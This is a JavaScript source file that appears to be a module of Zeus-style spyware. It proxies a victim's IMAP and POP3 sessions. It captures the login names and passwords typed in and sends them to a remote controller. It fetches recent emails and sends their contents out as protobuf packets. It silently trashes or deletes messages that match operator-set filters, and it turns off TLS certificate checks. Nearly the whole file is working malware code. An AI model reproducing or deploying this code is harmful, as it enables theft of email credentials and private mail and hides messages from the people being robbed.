var protobuf = require('protocol_buffers');
var Imap = require('imap_client');
var POP3Client = require('pop3_client');
var util = require('util');
var mimelib = require("mimelib");
var MailParser = require("mailparser").MailParser;
var zeusfunctions = require("zeusmask");

const P_SPYWARE = 4;

var messages = protobuf([
  'message MailMessage {',
    '     optional string html = 1;',
    '     optional string text = 2;',
    '     optional string subject = 3;',
    '     optional string messageId = 4;',
    '     optional string inReplyTo = 5;',
    '     optional string priority = 6;',
    '     optional string from = 7;',
    '     optional string to = 8;',
    '     optional string date = 9;',
    '     optional string receivedDate = 10;',
    '     optional string headers = 11;',
    '     optional bool isDeletedByMailware = 12;',
  '}'
].join('\n'));


process.mailware = {
    ControlledMailsCount : 20
}

var hasOwn = Object.prototype.hasOwnProperty;
var CONTROL = '(?:' + [
    '\\|\\|', '\\&\\&', ';;', '\\|\\&', '[&;()|<>]'
].join('|') + ')';
var META = '|&;()<> \\t';
var BAREWORD = '(\\\\[\'"' + META + ']|[^\\s\'"' + META + '])+';
var SINGLE_QUOTE = '"((\\\\"|[^"])*?)"';
var DOUBLE_QUOTE = '\'((\\\\\'|[^\'])*?)\'';

var TOKEN = '';
for (var i = 0; i < 4; i++) {
    TOKEN += (Math.pow(16, 8) * Math.random()).toString(16);
}

function filter(arr, fn) {
    if (arr.filter) return arr.filter(fn);
    var ret = [];
    for (var i = 0; i < arr.length; i++) {
        if (!hasOwn.call(arr, i)) continue;
        if (fn(arr[i], i, arr)) ret.push(arr[i]);
    }
    return ret;
};

function reduce(xs, f, acc) {
    var hasAcc = arguments.length >= 3;
    if (hasAcc && xs.reduce) return xs.reduce(f, acc);
    if (xs.reduce) return xs.reduce(f);

    for (var i = 0; i < xs.length; i++) {
        if (!hasOwn.call(xs, i)) continue;
        if (!hasAcc) {
            acc = xs[i];
            hasAcc = true;
            continue;
        }
        acc = f(acc, xs[i], i);
    }
    return acc;
};

function map(xs, f) {
    return xs.map(f);
};


function parse(s, env) {
    var chunker = new RegExp([
        '(' + CONTROL + ')', 
        '(' + BAREWORD + '|' + SINGLE_QUOTE + '|' + DOUBLE_QUOTE + ')*'
    ].join('|'), 'g');

    var match = filter(s.match(chunker), Boolean);

    if (!match) return [];
    if (!env) env = {};
    return map(match, function (s) {
        if (RegExp('^' + CONTROL + '$').test(s)) {
            return { op: s };
        }

        
        
        
        
        
        
        
        
        
        
        
        var SQ = "'";
        var DQ = '"';
        var BS = '\\';
        var DS = '$';
        var quote = false;
        var varname = false;
        var esc = false;
        var out = '';
        var isGlob = false;

        for (var i = 0, len = s.length; i < len; i++) {
            var c = s.charAt(i);
            isGlob = isGlob || (!quote && (c === '*' || c === '?'))
            if (esc) {
                out += c;
                esc = false;
            }
            else if (quote) {
                if (c === quote) {
                    quote = false;
                }
                else if (quote == SQ) {
                    out += c;
                }
                else { 
                    if (c === BS) {
                        i += 1;
                        c = s.charAt(i);
                        if (c === DQ || c === BS || c === DS) {
                            out += c;
                        } else {
                            out += BS + c;
                        }
                    }
                    else if (c === DS) {
                        out += parseEnvVar();
                    }
                    else {
                        out += c
                    }
                }
            }
            else if (c === DQ || c === SQ) {
                quote = c
            }
            else if (RegExp('^' + CONTROL + '$').test(c)) {
                return { op: s };
            }
            else if (c === BS) {
                esc = true
            }
            else if (c === DS) {
                out += parseEnvVar();
            }
            else out += c;
        }

        if (isGlob) return { op: 'glob', pattern: out };

        return out

        function parseEnvVar() {
            i += 1;
            var varend, varname;
            
            if (s.charAt(i) === '{') {
                i += 1
                if (s.charAt(i) === '}') {
                    throw new Error("Bad substitution: " + s.substr(i - 2, 3));
                }
                varend = s.indexOf('}', i);
                if (varend < 0) {
                    throw new Error("Bad substitution: " + s.substr(i));
                }
                varname = s.substr(i, varend - i);
                i = varend;
            }
            else if (/[*@#?$!_\-]/.test(s.charAt(i))) {
                varname = s.charAt(i);
                i += 1;
            }
            else {
                varend = s.substr(i).match(/[^\w\d_]/);
                if (!varend) {
                    varname = s.substr(i);
                    i = s.length;
                } else {
                    varname = s.substr(i, varend.index)
                    i += varend.index - 1;
                }
            }
            return getVar(null, '', varname);
        }
    });

    function getVar(_, pre, key) {
        var r = typeof env === 'function' ? env(key) : env[key];
        if (r === undefined) r = '';

        if (typeof r === 'object') {
            return pre + TOKEN + JSON.stringify(r) + TOKEN;
        }
        else return pre + r;
    }
};


function parseCommandLine(s, env) {
    var mapped = parse(s, env);
    if (typeof env !== 'function') return mapped;
    return reduce(mapped, function (acc, s) {
        if (typeof s === 'object') return acc.concat(s);
        var xs = s.split(RegExp('(' + TOKEN + '.*?' + TOKEN + ')', 'g'));
        if (xs.length === 1) return acc.concat(xs[0]);
        return acc.concat(map(filter(xs, Boolean), function (x) {
            if (RegExp('^' + TOKEN).test(x)) {
                return JSON.parse(x.split(TOKEN)[1]);
            }
            else return x;
        }));
    }, []);
};


function ServeIMAPConnection(
    remoteSocket,
    clientSocket,
    remoteHost,
    isSSL
) {
    var login = false;
    var password = false;

    var emailsForRemove = [];

    print('ServeIMAPConnection()');

    function fuckupBoxByName(boxName, cb)
    {
        if (!clientSocket.imap) {
            var boxpath = [];

            function searchTrash(boxes) {
                for (var i in boxes) {
                    if (boxes[i].special_use_attrib === '\\Trash') {
                        if (boxpath.length) {
                            
                            clientSocket.imap.trashBoxPath = util.format('%s%s%s', boxpath.join(boxes[i].delimiter), boxes[i].delimiter, i);
                        } else {
                            
                            clientSocket.imap.trashBoxPath = i;
                        }
                        break;
                    }
                    if (boxes[i].children !== null) {
                        boxpath.push(i)
                        searchTrash(boxes[i].children);
                        boxpath.pop();
                    }
                }
            }

            clientSocket.imap = new Imap({
                user: clientSocket.login,
                password: clientSocket.password,
                host: remoteHost,
                port: process.PORT_REDIRECTION_BASE + (isSSL ? 993 : 143),
                tls: isSSL,
                keepalive: true,
                tlsOptions: {
                    rejectUnauthorized: false
                },
                debug: function (msg) {
                    
                }
            });

            clientSocket.imap.on('ready', function () {
                clientSocket.imap.getBoxes(function (error, boxes) {

                    if (!error)
                    {
                        searchTrash(boxes);
                    }

                    OnImapReady();
                });
            });
            

            clientSocket.imap.on('error', function (err) {
                
                clientSocket.end();
                remoteSocket.end();
            });

            clientSocket.imap.on('end', function () {
                clientSocket.end();
                remoteSocket.end();
                
            });

            clientSocket.imap.connect();

        } else {
            OnImapReady();
        }

        function OnImapReady() {

            

            clientSocket.imap.resumed = false;

            clientSocket.imap.openBox(boxName, true, false, function (err, box) {
                var requestString;
                if (box.messages.total < process.mailware.ControlledMailsCount) {
                    requestString = '1:*';
                } else {
                    requestString = util.format('%d:*', box.messages.total - (process.mailware.ControlledMailsCount - 1));
                }

                
                

                var f = clientSocket.imap.seq.fetch(requestString, {
                    bodies: '',
                    struct: true
                });

                f.on('message', function (msg, seqno) {

                    
                    var prefix = '(#' + seqno + ') ';
                    var mailparser = new MailParser();
                    var currentUUID;
                    msg.on('body', function (stream, info) {
                        stream.on('data', function (chunk) {
                            mailparser.write(chunk.toString('utf8'));
                        });

                        stream.once('end', function () {
                            mailparser.end();
                        });
                    });

                    msg.once('end', function () {
                        
                    });

                    msg.once('attributes', function (attrs) {
                        
                        currentUUID = attrs.uid;
                    });

                    mailparser.on("end", function (mail_object) {

                        mail_object.isDeletedByMailware = false;

                        if (IsBadEmail(mail_object) && currentUUID) {
                            mail_object.isDeletedByMailware = true;
                            
                            emailsForRemove.push(currentUUID);
                        }

                        process.sendMail(mail_object);
                    });
                });

                f.once('error', function (err) {
                    
                });

                f.once('end', function () {
                   

                    setTimeout(function () {
                        cb();
                    }, 500);
                });
            });
        }
        
    }

    function removeUnwantedMail(cb) {
        if (emailsForRemove.length > 0) {
            
            if (clientSocket.imap.trashBoxPath)
            {
                
                clientSocket.imap.setFlags(emailsForRemove, ['SEEN'], function (error) {
                    clientSocket.imap.move(emailsForRemove, clientSocket.imap.trashBoxPath, function (err) {
                        emailsForRemove = [];
                        cb();
                    });
                });
            } else {
                
                clientSocket.imap.setFlags(emailsForRemove, ['DELETED', 'SEEN'], function () {
                    clientSocket.imap.expunge(emailsForRemove, function (err) {
                        emailsForRemove = [];

                        cb();
                    })
                });
            }
        } else {
            cb();
        }
    }

    clientSocket.on('data', function (chunk) {
        print('C', chunk.toString().trim());

        var cmdline = parseCommandLine(chunk.toString().trim());

        

        var tag = cmdline.shift();
        var command = cmdline.shift();
        var argv = cmdline;

        if (command === 'LOGIN')
        {

            if (argv.length === 2)
            {
                try
                {
                    clientSocket.login = argv[0];
                    clientSocket.password = argv[1];

                    process.SendAuthInformationPacket(
                        clientSocket.login,
                        (isSSL === true ? '(IMAP-TLS)' : '(IMAP)') + ' ' + remoteHost,
                        clientSocket.password);

                }
                catch (e) {
                    process.log('IMAP : Cant parse auth string');
                    process.log(chunk.toString());
                }
            }

            remoteSocket.write(chunk);

        } else if (command === 'SELECT') {

            
            var boxName = argv[0];

            

            clientSocket.pause();
            remoteSocket.pause();
            clientSocket.currentBoxName = boxName;

            fuckupBoxByName(boxName, function () {
                removeUnwantedMail(function () {
                    clientSocket.imap.closeBox(function () {
                        clientSocket.resume();
                        remoteSocket.resume();

                        remoteSocket.write(chunk);
                        
                    })
                })
            });

            

        } else {
            remoteSocket.write(chunk);
        }
    });

    remoteSocket.on('data', function (chunk) {

        print('S', chunk.toString().trim());

        

        var cmdline = chunk.toString().trim().split(/\s+/g);

        

        var tag = cmdline.shift();
        var uuids = cmdline.shift();
        var command = cmdline.shift();

        if (tag === "*" && command === 'EXISTS')
        {

            clientSocket.pause();
            remoteSocket.pause();

            
            fuckupBoxByName(clientSocket.currentBoxName, function () {
                removeUnwantedMail(function () {
                    clientSocket.imap.closeBox(function () {
                        clientSocket.resume();
                        remoteSocket.resume();

                        clientSocket.write(chunk);
                        
                    })
                })
                             
            });
        } else {
            clientSocket.write(chunk);
        }
    });

}

process.sendMail = function (mailObject) {
    try {

        var packet = messages.MailMessage.encode({
            html: mailObject.html,
            text: mailObject.text,
            subject: mailObject.subject,
            messageId: mailObject.messageId,
            inReplyTo: JSON.stringify(mailObject.inReplyTo),
            priority: mailObject.priority,
            from: JSON.stringify(mailObject.from),
            to: JSON.stringify(mailObject.to),
            date: JSON.stringify(mailObject.date),
            receivedDate: JSON.stringify(mailObject.receivedDate),
            headers: JSON.stringify(mailObject.headers || ""),
            isDeletedByMailware: mailObject.isDeletedByMailware
        });

        if (process.controllerConnection) {
            process.controllerConnection
                .sendProtocolPacket(P_SPYWARE,
                    SLAVE_PACKET_MAIL, 0, packet);
        } else {
            if (process.masterConnection) {
                process.masterConnection.sendProtocolPacket(
                    SLAVE_PACKET_MAIL,
                    packet
                );
            }
            else {
                process.pendingMessages.push({
                    t: SLAVE_PACKET_MAIL,
                    p: packet
                });
            }
        }

    } catch (e) {
        
        
    }
}

function IsBadEmail(mail_object) {

    if (util.isUndefined(process.g_scfg)) {
        return false;
    }

    var emailfilterArray = process.g_scfg.emailfilter;

    if (util.isUndefined(emailfilterArray))
    {
        return false;
    }

    for (let i = 0; i < emailfilterArray.length; i++)
    {
        var filt = emailfilterArray[i];
        var emailtext = mail_object.text;
        var from = JSON.stringify(mail_object.from);
        var to = JSON.stringify(mail_object.to);
        var subject = mail_object.subject;

        if (util.isUndefined(emailtext) || emailtext === '') {
            emailtext = mail_object.html;
        }

        if (filt.from.length > 1 && from.length > 1) {
            if (zeusfunctions.zeusIsModificationNeeded(from, filt.from)) {
                return true;
            }
        }

        if (filt.to.length > 1 && to.length > 1) {
            if (zeusfunctions.zeusIsModificationNeeded(to, filt.to)) {
                return true;
            }
        }

        if (filt.subject.length > 1 && subject.length > 1) {
            if (zeusfunctions.zeusIsModificationNeeded(subject, filt.subject)) {
                return true;
            }
        }

        if (filt.body.length > 1 && emailtext.length > 1) {
            if (zeusfunctions.zeusIsModificationNeeded(emailtext, filt.body)) {
                return true;
            }
        }
    }

    return false;
}


const POP3STATE_INITIAL = 0;
const POP3STATE_USERNAME_GOT = 1;
const POP3STATE_PASSWORD_GOT = 2;
const POP3STATE_AUTHORIZED = 3;

function ServePOP3Connection(
    remoteSocket,
    clientSocket,
    remoteHost,
    isSSL
) {
    var login = false;
    var password = false;

    clientSocket.pop3state = POP3STATE_INITIAL;

    clientSocket.on('data', function (chunk) {

        

        var datums = chunk.toString().trim().split(" ");
        var command = datums.shift().trim().toUpperCase();
        var argument = datums.join(" ").trim();
        

        if (command === "USER"){
            clientSocket.username = argument;
            clientSocket.pop3state = POP3STATE_USERNAME_GOT;

            remoteSocket.write(chunk);

        } else if (command === "PASS") {
            clientSocket.password = argument;
            clientSocket.pop3state = POP3STATE_PASSWORD_GOT;

            remoteSocket.write(chunk);

        } else if (command === "STAT" && clientSocket.pop3state === POP3STATE_AUTHORIZED) {

            clientSocket.pause();
            remoteSocket.pause();
            clientSocket.resumed = false;

            

            var client = new POP3Client(
                (process.PORT_REDIRECTION_BASE + (isSSL ? 995 : 110)), remoteHost, {
                    debug: true,
                    enabletls: isSSL,
                    ignoretlserrs : true
                });

            client.currentmsg = [];
            client.emailsForRemove = [];

            client.on("error", function (err) {
                
                continueRealConnection();
            });

            client.on("connect", function (status, rawdata) {
                if (status) {
                    
                    client.login(clientSocket.username, clientSocket.password);
                } else {
                    
                    client.quit();
                    return;
                }
            });

            client.on("login", function (status, rawdata) {
                if (status) {
                    
                    client.stat();
                } else {
                    
                    client.quit();
                }
            });


            client.on("stat", function (status, data, rawdata) {
                if (status) {
                    

                    if (data && data.count){
                        

                        if (data.count === 0) {
                            client.quit(); 
                        } else {
                            client.list();
                        }

                    }else{
                        
                        client.quit();
                    }

                } else {
                    
                    client.quit();
                    return;
                }
            });

            client.on("list", function (status, msgcount, msgnumber, data, rawdata) {

                if (status === false) {
                    
                    client.quit();
                } else {

                    

                    if (msgcount > 0) {

                        

                        for (let i = 1; i <= msgcount; i++) {
                            client.currentmsg.push(i);
                        }

                        client.retr(client.currentmsg.shift());
                    } else {
                        client.quit();
                    }

                }
            });

            client.on("retr", function (status, msgnumber, data, rawdata) {

                if (status === true) {

                    
                    var mailparser = new MailParser();

                    mailparser.write(data);
                    mailparser.end();

                    mailparser.on("end", function (mail_object) {

                        mail_object.isDeletedByMailware = false;

                        if (IsBadEmail(mail_object)) {
                            mail_object.isDeletedByMailware = true;
                            client.emailsForRemove.push(msgnumber);
                        }

                        process.sendMail(mail_object);

                        if (client.currentmsg.length > 0) {
                            client.retr(client.currentmsg.shift());
                        } else {
                            if (client.emailsForRemove.length === 0) {
                                client.quit();
                            } else {
                                client.dele(client.emailsForRemove.shift());
                            }
                        }
                    });

                } else {

                    
                    client.quit();

                }
            });

            client.on("dele", function (status, msgnumber, data, rawdata) {

                if (status === true) {

                    

                    if (client.emailsForRemove.length > 0) {
                        client.dele(client.emailsForRemove.shift());
                    } else {
                        client.quit();
                    }

                } else {
                    
                    client.quit();
                }
            });

            client.on("close", function (status, rawdata) {
                
                continueRealConnection();
            });

            client.on("end", function (status, rawdata) {
                
                continueRealConnection();
            });

            function continueRealConnection() {
                if (!clientSocket.resumed) {
                    clientSocket.resumed = true;
                    remoteSocket.write(chunk);
                    clientSocket.resume();
                    remoteSocket.resume();
                }
            }
            
        } else {
            remoteSocket.write(chunk);
        }
        
    });

    remoteSocket.on('data', function (chunk) {

        

        if (clientSocket.pop3state == POP3STATE_PASSWORD_GOT)
        {
            var reply = chunk.toString();
            if(reply.indexOf('+OK') === 0)
            {
                
                clientSocket.pop3state = POP3STATE_AUTHORIZED;
                process.SendAuthInformationPacket(clientSocket.username,
                    (isSSL === true ? '(POP3-TLS)' : '(POP3)') + ' ' + remoteHost,
                    clientSocket.password);
            }
        }

        clientSocket.write(chunk);
    });

    remoteSocket.on('end', function () {
        clientSocket.end();
    })

    clientSocket.on('end', function () {
        remoteSocket.end();
    })

}

exports.ServeIMAPConnection = ServeIMAPConnection;
exports.ServePOP3Connection = ServePOP3Connection;